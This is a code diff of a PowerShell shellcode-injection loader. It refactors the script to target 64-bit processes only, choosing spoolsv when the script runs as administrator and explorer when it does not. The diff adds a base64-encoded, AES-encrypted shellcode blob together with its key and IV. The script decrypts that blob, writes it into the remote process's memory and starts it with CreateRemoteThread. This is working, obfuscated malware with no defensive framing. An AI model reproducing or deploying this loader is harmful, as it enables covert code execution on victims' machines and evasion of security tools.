@@ -38,50 +38,32 @@ function IsElevated() {
     $windowsPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-# check if we are running on a 32-bit or 64-bit process
-if ([IntPtr]::Size -eq 4) {
-    $arch = 'x86'
+if (-not ($remoteProc -eq '')) {
     if (-not (IsElevated)) {
         Write-Warning '[!] You are not running this script as an administrator.'
     } else {
         Write-Host '[*] You are running this script as an administrator.'
     }
-    Write-Host '[i] Injecting into process: ' (Get-Process -Id $PID).Name
-    $remoteProcId = $PID
-} elseif ([IntPtr]::Size -eq 8) {
-    $arch = 'x64'
-    if (-not ($remoteProc -eq '')) {
-        if (-not (IsElevated)) {
-            Write-Warning '[!] You are not running this script as an administrator.'
-        } else {
-            Write-Host '[*] You are running this script as an administrator.'
-        }
+    Write-Host '[i] Injecting into process: ' $remoteProc
+} else {
+    if (-not (IsElevated)) {
+        Write-Warning '[!] You are not running this script as an administrator.'
+        $remoteProc = 'explorer'
         Write-Host '[i] Injecting into process: ' $remoteProc
     } else {
-        if (-not (IsElevated)) {
-            Write-Warning '[!] You are not running this script as an administrator.'
-            $remoteProc = 'explorer'
-            Write-Host '[i] Injecting into process: ' $remoteProc
-        } else {
-            Write-Host '[*] You are running this script as an administrator.'
-            $remoteProc = 'spoolsv'
-            Write-Host '[i] Injecting into process: ' $remoteProc
-        }
+        Write-Host '[*] You are running this script as an administrator.'
+        $remoteProc = 'spoolsv'
+        Write-Host '[i] Injecting into process: ' $remoteProc
     }
-    # try to get process id of remote process
-    try {
-        $remoteProcId = (Get-Process -Name $remoteProc).Id[0]
-    } catch {
-        Write-Warning '[!] Unable to get process id of remote process.'
-        Write-Warning -Message "[!] Last error: $($GetLastError.Invoke())"
-        exit
-    }
-} else {
-    Write-Warning '[!] Unable to determine current process architecture.'
+}
+# try to get process id of remote process
+try {
+    $remoteProcId = (Get-Process -Name $remoteProc).Id[0]
+} catch {
+    Write-Warning '[!] Unable to get process id of remote process.'
+    Write-Warning -Message "[!] Last error: $($GetLastError.Invoke())"
     exit
 }
-Write-Host '[+] Current process architecture: ' $arch
-Write-Host ''
 
 $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'GetLastError'), (GetDelegateType @() ([UInt32])))
 
@@ -115,27 +97,20 @@ if ($remoteAlloc -eq 0) {
 }
 
 # buf to hold shellcode
+$Key = [System.Convert]::FromBase64String("AYk2CqMZPjwkcuaYLyzWwHW5LwbogkrmNj0hSnlFGK8=")
+$IV = [System.Convert]::FromBase64String("386kdvJKW47pxPa55sRDYA==")
+$EncryptedBytes = [System.Convert]::FromBase64String("6cRNh6VYAiHYnaSjG8J9aODK8XXviJ3GKNCOWyHHJRy3dcmQuDWonNASFkyGXX/nz+9YeDmu0/hqmVZwy2mEqaCES/lRXx3TcVFTddWhRY/650nUuIVRMfSPla7Wxcteihn9k8EP9jNGorkqSIWDUDDX5fpN6j06ABpPuOLFXh60zCwsln2myl8EMUUeKZCZX+L0a20Wltv8vCwFxIF/cWmwMNV6bSkGGyPeGeiLB8NuC67EsCnqJaXQK3UAuqkZH+peG7o4a9cbF5NMZrIwsIHQlMoxCnYYiDnUjkFjrYiIllcOnf7xY0rlh2vwsWftE3k0kzSSicrQnuL5jXdy1IcBWQww5ajhLFt1tz/FA7gMG1xfPoleU3D8BsJ1zxjoe0Wo9RY/KS8S05DrUhgCb3/nKH1qH+IcHKss2OaXSbOUoKFS1M+3nS80S4164xr76NfC5wiACxqfkB8YT9GPkBtPeEHrMH0Tbb++Qdt1qUsvzMjlTGA/Baf6mE1zOF8kRByWg4F1GZ+iMalZoiyEgpeC4xW1MeIfj11NV2n6mdMOzcpPRFmeXRH2JFEvDHdwylhDrNgYsyMHyVvRqYNr6op46O3KX6v9h6sEFI71nLg+ZiGqZ70iIaDGbLjVGH5Lty3xhIfDAREFKsK58VXdLd1KMjBFI3oDnBavYB3AKlw=")
 
-# get current process architecture
-if ($arch -eq 'x86') {
+$AesManaged = New-Object Security.Cryptography.AesManaged
+$AesManaged.Key = $Key
+$AesManaged.IV = $IV
+$AesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
+$AesManaged.Padding = [Security.Cryptography.PaddingMode]::PKCS7
+$Decryptor = $AesManaged.CreateDecryptor($AesManaged.Key, $AesManaged.IV)
 
-} else {
-    #64
-    $Key = [System.Convert]::FromBase64String("AYk2CqMZPjwkcuaYLyzWwHW5LwbogkrmNj0hSnlFGK8=")
-    $IV = [System.Convert]::FromBase64String("386kdvJKW47pxPa55sRDYA==")
-    $EncryptedBytes = [System.Convert]::FromBase64String("6cRNh6VYAiHYnaSjG8J9aODK8XXviJ3GKNCOWyHHJRy3dcmQuDWonNASFkyGXX/nz+9YeDmu0/hqmVZwy2mEqaCES/lRXx3TcVFTddWhRY/650nUuIVRMfSPla7Wxcteihn9k8EP9jNGorkqSIWDUDDX5fpN6j06ABpPuOLFXh60zCwsln2myl8EMUUeKZCZX+L0a20Wltv8vCwFxIF/cWmwMNV6bSkGGyPeGeiLB8NuC67EsCnqJaXQK3UAuqkZH+peG7o4a9cbF5NMZrIwsIHQlMoxCnYYiDnUjkFjrYiIllcOnf7xY0rlh2vwsWftE3k0kzSSicrQnuL5jXdy1IcBWQww5ajhLFt1tz/FA7gMG1xfPoleU3D8BsJ1zxjoe0Wo9RY/KS8S05DrUhgCb3/nKH1qH+IcHKss2OaXSbOUoKFS1M+3nS80S4164xr76NfC5wiACxqfkB8YT9GPkBtPeEHrMH0Tbb++Qdt1qUsvzMjlTGA/Baf6mE1zOF8kRByWg4F1GZ+iMalZoiyEgpeC4xW1MeIfj11NV2n6mdMOzcpPRFmeXRH2JFEvDHdwylhDrNgYsyMHyVvRqYNr6op46O3KX6v9h6sEFI71nLg+ZiGqZ70iIaDGbLjVGH5Lty3xhIfDAREFKsK58VXdLd1KMjBFI3oDnBavYB3AKlw=")
-
-    $AesManaged = New-Object Security.Cryptography.AesManaged
-    $AesManaged.Key = $Key
-    $AesManaged.IV = $IV
-    $AesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
-    $AesManaged.Padding = [Security.Cryptography.PaddingMode]::PKCS7
-    $Decryptor = $AesManaged.CreateDecryptor($AesManaged.Key, $AesManaged.IV)
-
-    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
-        
-    [Byte[]] $buf = $DecryptedBytes
-} 
+$DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
+    
+[Byte[]] $buf = $DecryptedBytes
 
 # write shellcode to allocated memory
 Write-Host '[i] Injecting shellcode into remote process memory.'
@@ -157,13 +132,8 @@ Write-Host ''
 Write-Host '[i] Creating thread in remote process.'
 
 # check if we are injecting into a 32-bit process
-if ($arch -eq 'x86') {
-    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'CreateRemoteThread'), (GetDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
-    $remoteThread = $CreateRemoteThread.Invoke($remoteProcHandle, 0, 0, $remoteAlloc, 0, 0, 0)
-} else {
-    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'CreateRemoteThread'), (GetDelegateType @([IntPtr], [IntPtr], [UInt64], [IntPtr], [IntPtr], [UInt64], [IntPtr]) ([IntPtr])))
-    $remoteThread = $CreateRemoteThread.Invoke($remoteProcHandle, 0, 0, $remoteAlloc, 0, 0, 0)
-}
+$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'CreateRemoteThread'), (GetDelegateType @([IntPtr], [IntPtr], [UInt64], [IntPtr], [IntPtr], [UInt64], [IntPtr]) ([IntPtr])))
+$remoteThread = $CreateRemoteThread.Invoke($remoteProcHandle, 0, 0, $remoteAlloc, 0, 0, 0)
 
 # confirm we created a thread in the remote process
 if ($remoteThread -eq 0) {
